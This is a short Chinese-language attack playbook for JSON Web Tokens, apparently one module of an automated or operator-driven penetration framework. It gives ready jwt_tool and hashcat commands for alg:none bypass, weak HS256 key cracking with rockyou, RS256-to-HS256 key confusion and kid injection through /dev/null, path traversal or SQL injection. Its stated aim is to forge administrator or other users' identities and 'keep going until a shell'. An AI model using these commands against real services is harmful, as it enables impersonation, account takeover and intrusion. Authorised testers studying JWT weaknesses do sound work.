# JWT

> **TECH：** 改算法/密钥/kid 伪造身份
> **成功：** 伪造成管理员/他人身份后，本模块继续找执行点直到 shell
> HS256 弱密钥：**本模块**用 `jwt_tool -C` 或 hashcat `-m 16500` 砸短字典，爆了立刻签发继续打到 shell。长时间 GPU / 全 rockyou 仅当操作者另选 `/creds` 当独立作业。

## JWT攻击

### 结构

```
header.payload.signature（三段base64用.连接，以eyJ开头）
header:  {"alg":"HS256","typ":"JWT"}
payload: {"sub":"user","role":"user","exp":...}
```

### alg:none 绕过

```
# header改成 "alg":"none"，删掉signature（保留末尾的.）
jwt_tool <token> -X a
# 服务端接受 → 伪造成功，任意改payload
```

### 弱密钥爆破（HS256最常见）

```
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt
# 本模块短字典；长时间 GPU 才候选 /creds
# hashcat -m 16500 jwt.txt wordlist.txt
# 爆出密钥后用它签自己的payload
jwt_tool <token> -S hs256 -p '<密钥>' -T    # -T交互改payload
```

### RS256→HS256 密钥混淆

```
# 条件：能拿到服务端RSA公钥（/jwks.json 或证书）
jwt_tool <token> -X k -pk public.pem
# 原理：改成HS256后服务端拿公钥当HMAC密钥，而公钥是公开的
```

### kid注入

```
# header的kid指向密钥来源
# 改成 /dev/null（空密钥）或路径遍历/SQL注入控制它
```

### 一键全测

```
jwt_tool <token> -M at
```

---

